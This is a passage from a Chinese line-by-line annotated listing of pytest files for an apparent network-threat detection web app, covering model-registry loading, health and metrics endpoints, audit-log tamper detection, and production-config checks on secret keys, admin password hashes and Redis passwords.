| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        version="legacy-v",` |
| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        schema_name="network_flow_v1",` |
| 170 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        schema_version="1",` |
| 171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feature_columns=list(NSL_KDD_FEATURE_COLUMNS),` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        training_dataset="NSL-KDD",` |
| 173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        metrics={},` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        artifact_files={"model": "ddos_rf_v1.pkl"},` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        trust_tier="prototype_nsl_kdd",` |
| 176 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        adapter="nsl_kdd_v1",` |
| 177 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 178 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reg = ModelRegistry(str(tmp_path), audit_sink=None)` |
| 179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    path = reg.resolve_load_path("ddos")` |
| 180 | 断言：验证测试或运行时假设是否成立。 | `    assert path and path.endswith("ddos_rf_v1.pkl")` |
| 181 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    det = DDoSDetector()` |
| 182 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.try_load_detector("ddos", det) is True` |

## `tests/test_observability_r5.py`

- 类型：测试
- 行数：157

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""R5 运维可观测：健康检查、Prometheus 指标、审计完整性巡检。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 6 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 8 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 函数定义：声明 `_make_app` 的输入、处理逻辑和返回结果。 | `def _make_app(monkeypatch, tmp_path):` |
| 11 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("FLASK_ENV", "testing")` |
| 12 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("AUDIT_INTEGRITY_PATROL", "false")` |
| 13 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    db_file = tmp_path / "r5.db"` |
| 14 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{db_file.as_posix()}")` |
| 15 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("SECRET_KEY", "test-secret-key-which-is-at-least-32b")` |
| 16 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_USERNAME", "admin")` |
| 17 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_PASSWORD", "changeme")` |
| 18 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("REDIS_HOST", "127.0.0.1")` |
| 19 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("REDIS_PORT", "63999")` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, _ = create_app()` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["TESTING"] = True` |
| 25 | 返回结果：把处理后的值交回调用方。 | `    return app` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 函数定义：声明 `test_healthz_ok` 的输入、处理逻辑和返回结果。 | `def test_healthz_ok(monkeypatch, tmp_path):` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _make_app(monkeypatch, tmp_path)` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = app.test_client()` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = client.get("/healthz")` |
| 32 | 断言：验证测试或运行时假设是否成立。 | `    assert r.status_code == 200` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    body = r.get_json()` |
| 34 | 断言：验证测试或运行时假设是否成立。 | `    assert body.get("status") == "live"` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 37 | 函数定义：声明 `test_readyz_ok_when_testing` 的输入、处理逻辑和返回结果。 | `def test_readyz_ok_when_testing(monkeypatch, tmp_path):` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _make_app(monkeypatch, tmp_path)` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = app.test_client()` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = client.get("/readyz")` |
| 41 | 断言：验证测试或运行时假设是否成立。 | `    assert r.status_code == 200` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    data = r.get_json()` |
| 43 | 断言：验证测试或运行时假设是否成立。 | `    assert data.get("status") in ("ready", "degraded")` |
| 44 | 断言：验证测试或运行时假设是否成立。 | `    assert "checks" in data` |
| 45 | 断言：验证测试或运行时假设是否成立。 | `    assert data["checks"]["database"]["ok"] is True` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 函数定义：声明 `test_readyz_unready_on_db_failure` 的输入、处理逻辑和返回结果。 | `def test_readyz_unready_on_db_failure(monkeypatch, tmp_path):` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _make_app(monkeypatch, tmp_path)` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = app.test_client()` |
| 51 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 52 | 导入对象：从指定模块引入类、函数或常量。 | `    from web import observability_routes` |
| 53 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 54 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setattr(` |
| 55 | 代码语句：参与当前文件的业务流程或数据处理。 | `        observability_routes,` |
| 56 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "_checks_database",` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        lambda: (False, "forced_failure"),` |
| 58 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = client.get("/readyz")` |
| 60 | 断言：验证测试或运行时假设是否成立。 | `    assert r.status_code == 503` |
| 61 | 断言：验证测试或运行时假设是否成立。 | `    assert r.get_json().get("status") == "unready"` |
| 62 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 63 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 64 | 函数定义：声明 `test_metrics_contains_key_series` 的输入、处理逻辑和返回结果。 | `def test_metrics_contains_key_series(monkeypatch, tmp_path):` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _make_app(monkeypatch, tmp_path)` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    client = app.test_client()` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = client.get("/metrics")` |
| 68 | 断言：验证测试或运行时假设是否成立。 | `    assert r.status_code == 200` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    text = r.data.decode("utf-8")` |
| 70 | 循环：逐个处理集合或迭代器中的元素。 | `    for name in (` |
| 71 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "guardian_packets_total",` |
| 72 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "guardian_packets_dropped_total",` |
| 73 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "guardian_detection_latency_ms_sum",` |
| 74 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "guardian_detection_latency_ms_count",` |
| 75 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "guardian_detection_latency_ms",` |
| 76 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "guardian_alerts_total",` |
| 77 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "guardian_model_ready",` |
| 78 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "redis_stream_pending",` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "audit_integrity_valid",` |
| 80 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ):` |
| 81 | 断言：验证测试或运行时假设是否成立。 | `        assert name in text` |
| 82 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 83 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 84 | 函数定义：声明 `test_audit_integrity_failure_creates_critical_trace` 的输入、处理逻辑和返回结果。 | `def test_audit_integrity_failure_creates_critical_trace(monkeypatch, tmp_path):` |
| 85 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.chdir(tmp_path)` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("FLASK_ENV", "testing")` |
| 87 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("AUDIT_INTEGRITY_PATROL", "false")` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    db_file = tmp_path / "r5_audit.db"` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{db_file.as_posix()}")` |
| 90 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("SECRET_KEY", "test-secret-key-which-is-at-least-32b")` |
| 91 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_USERNAME", "admin")` |
| 92 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_PASSWORD", "changeme")` |
| 93 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    logd = tmp_path / "logs"` |
| 95 | 函数调用：执行已有函数/方法完成当前步骤。 | `    logd.mkdir(parents=True, exist_ok=True)` |
| 96 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 97 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 98 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 99 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, _ = create_app()` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["TESTING"] = True` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["GUARDIAN_LOG_DIR"] = str(logd)` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["LOG_INTEGRITY_ENABLED"] = True` |
| 103 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 104 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.audit.security_logger import SecurityLogger` |
| 105 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 106 | 日志记录：输出运行状态、调试信息或异常线索。 | `    sec_logger = logging.getLogger("security")` |
| 107 | 日志记录：输出运行状态、调试信息或异常线索。 | `    sec_logger.handlers.clear()` |
| 108 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sl = SecurityLogger(log_dir=str(logd), enable_integrity=True)` |
| 110 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sl.log_system("seed-a", "info")` |
| 111 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sl.log_system("seed-b", "info")` |
| 112 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sec_path = logd / "security.log"` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw = sec_path.read_text(encoding="utf-8").strip().split("\n")` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    first = json.loads(raw[0])` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    first["event_type"] = "tampered"` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    raw[0] = json.dumps(first, ensure_ascii=False)` |
| 118 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sec_path.write_text("\n".join(raw) + "\n", encoding="utf-8")` |
| 119 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 120 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.audit_integrity_patrol import (` |
| 121 | 代码语句：参与当前文件的业务流程或数据处理。 | `        get_last_audit_integrity_valid,` |
| 122 | 代码语句：参与当前文件的业务流程或数据处理。 | `        run_audit_integrity_patrol_once,` |
| 123 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 124 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 125 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.models import Alert` |
| 126 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 127 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        before = db.session.query(Alert).count()` |
| 129 | 函数调用：执行已有函数/方法完成当前步骤。 | `        run_audit_integrity_patrol_once(app)` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        after = db.session.query(Alert).count()` |
| 131 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 132 | 断言：验证测试或运行时假设是否成立。 | `    assert get_last_audit_integrity_valid() is False` |
| 133 | 断言：验证测试或运行时假设是否成立。 | `    assert after >= before` |
| 134 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    tail = sec_path.read_text(encoding="utf-8")` |
| 136 | 断言：验证测试或运行时假设是否成立。 | `    assert "audit_integrity" in tail` |
| 137 | 断言：验证测试或运行时假设是否成立。 | `    assert "critical" in tail` |
| 138 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 139 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = (` |
| 141 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.query(Alert)` |
| 142 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .filter(Alert.threat_type == "audit_integrity")` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .order_by(Alert.created_at.desc())` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .first()` |
| 145 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 146 | 断言：验证测试或运行时假设是否成立。 | `        assert row is not None` |
| 147 | 断言：验证测试或运行时假设是否成立。 | `        assert row.level == "critical"` |
| 148 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 149 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 150 | 函数定义：声明 `test_verify_integrity_missing_file_is_valid` 的输入、处理逻辑和返回结果。 | `def test_verify_integrity_missing_file_is_valid(monkeypatch, tmp_path):` |
| 151 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.audit.security_logger import SecurityLogger` |
| 152 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    empty_dir = tmp_path / "empty_logs"` |
| 154 | 函数调用：执行已有函数/方法完成当前步骤。 | `    empty_dir.mkdir()` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sl = SecurityLogger(log_dir=str(empty_dir), enable_integrity=True)` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = sl.verify_integrity()` |
| 157 | 断言：验证测试或运行时假设是否成立。 | `    assert r["valid"] is True` |

## `tests/test_production_hardening.py`

- 类型：测试
- 行数：207

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""生产安全硬化：密钥、管理员、JWT、CORS、Webhook SSRF、Redis 密码。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import subprocess` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 函数定义：声明 `_run_fresh_config_snippet` 的输入、处理逻辑和返回结果。 | `def _run_fresh_config_snippet(code: str, env: dict[str, str]) -> subprocess.CompletedProcess:` |
| 14 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    full = os.environ.copy()` |
| 15 | 函数调用：执行已有函数/方法完成当前步骤。 | `    full.update(env)` |
| 16 | 返回结果：把处理后的值交回调用方。 | `    return subprocess.run(` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `        [sys.executable, "-c", code],` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cwd=PROJECT_ROOT,` |
| 19 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        env=full,` |
| 20 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        capture_output=True,` |
| 21 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        text=True,` |
| 22 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        timeout=60,` |
| 23 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 函数定义：声明 `test_production_startup_fails_without_secret_key` 的输入、处理逻辑和返回结果。 | `def test_production_startup_fails_without_secret_key():` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    code = (` |
| 28 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import os, sys\n"` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['FLASK_ENV']='production'\n"` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['DATABASE_URL']='sqlite:///:memory:'\n"` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "if 'SECRET_KEY' in os.environ: del os.environ['SECRET_KEY']\n"` |
| 32 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "try:\n"` |
| 33 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "    import importlib\n"` |
| 34 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "    import config.config as cc\n"` |
| 35 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "    importlib.reload(cc)\n"` |
| 36 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "except RuntimeError as e:\n"` |
| 37 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "    print('EXPECTED', e)\n"` |
| 38 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "    sys.exit(0)\n"` |
| 39 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "sys.exit(1)\n"` |
| 40 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    p = _run_fresh_config_snippet(code, {})` |
| 42 | 断言：验证测试或运行时假设是否成立。 | `    assert p.returncode == 0, p.stderr + p.stdout` |
| 43 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 44 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 45 | 函数定义：声明 `test_production_get_config_rejects_default_secret` 的输入、处理逻辑和返回结果。 | `def test_production_get_config_rejects_default_secret():` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    code = (` |
| 47 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import os, sys\n"` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['FLASK_ENV']='production'\n"` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['DATABASE_URL']='sqlite:///:memory:'\n"` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['SECRET_KEY']='dev-only-insecure-key-never-use-in-production'\n"` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['ADMIN_PASSWORD_HASH']='pbkdf2:sha256:1$test$somethinginvalid'\n"` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['REDIS_PASSWORD']='x'\n"` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['ALLOWED_ORIGINS']='https://example.com'\n"` |
| 54 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import importlib\n"` |
| 55 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import config.config as cc\n"` |
| 56 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "importlib.reload(cc)\n"` |
| 57 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "try:\n"` |
| 58 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "    cc.get_config()\n"` |
| 59 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "except RuntimeError as e:\n"` |
| 60 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "    if 'SECRET_KEY' in str(e) or '禁止' in str(e):\n"` |
| 61 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "        print('ok')\n"` |
| 62 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "        sys.exit(0)\n"` |
| 63 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "    raise\n"` |
| 64 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "sys.exit(1)\n"` |
| 65 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    p = _run_fresh_config_snippet(code, {})` |
| 67 | 断言：验证测试或运行时假设是否成立。 | `    assert p.returncode == 0, p.stderr + p.stdout` |
| 68 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 69 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 70 | 函数定义：声明 `test_production_get_config_requires_admin_password_hash` 的输入、处理逻辑和返回结果。 | `def test_production_get_config_requires_admin_password_hash():` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    code = (` |
| 72 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import os, sys\n"` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['FLASK_ENV']='production'\n"` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['DATABASE_URL']='sqlite:///:memory:'\n"` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['SECRET_KEY']='a' * 40\n"` |
| 76 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "os.environ.pop('ADMIN_PASSWORD_HASH', None)\n"` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['REDIS_PASSWORD']='redis-secret'\n"` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['ALLOWED_ORIGINS']='https://app.example.com'\n"` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import importlib\n"` |
| 80 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import config.config as cc\n"` |
| 81 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "importlib.reload(cc)\n"` |
| 82 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "try:\n"` |
| 83 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "    cc.get_config()\n"` |
| 84 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "except RuntimeError as e:\n"` |
| 85 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "    if 'ADMIN_PASSWORD_HASH' in str(e):\n"` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "        sys.exit(0)\n"` |
| 87 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "    raise\n"` |
| 88 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "sys.exit(1)\n"` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    p = _run_fresh_config_snippet(code, {})` |
| 91 | 断言：验证测试或运行时假设是否成立。 | `    assert p.returncode == 0, p.stderr + p.stdout` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 94 | 函数定义：声明 `test_production_get_config_requires_redis_password` 的输入、处理逻辑和返回结果。 | `def test_production_get_config_requires_redis_password():` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    code = (` |
| 96 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import os, sys\n"` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['FLASK_ENV']='production'\n"` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['DATABASE_URL']='sqlite:///:memory:'\n"` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['SECRET_KEY']='a' * 40\n"` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['ADMIN_PASSWORD_HASH']='pbkdf2:sha256:1$test$somethinginvalid'\n"` |
| 101 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "os.environ.pop('REDIS_PASSWORD', None)\n"` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "os.environ['ALLOWED_ORIGINS']='https://app.example.com'\n"` |
| 103 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import importlib\n"` |
| 104 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "import config.config as cc\n"` |
| 105 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "importlib.reload(cc)\n"` |
| 106 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "try:\n"` |
| 107 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "    cc.get_config()\n"` |
| 108 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "except RuntimeError as e:\n"` |
| 109 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "    if 'REDIS_PASSWORD' in str(e):\n"` |
| 110 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "        sys.exit(0)\n"` |
| 111 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "    raise\n"` |
| 112 | 函数调用：执行已有函数/方法完成当前步骤。 | `        "sys.exit(1)\n"` |
| 113 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    p = _run_fresh_config_snippet(code, {})` |
| 115 | 断言：验证测试或运行时假设是否成立。 | `    assert p.returncode == 0, p.stderr + p.stdout` |
| 116 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
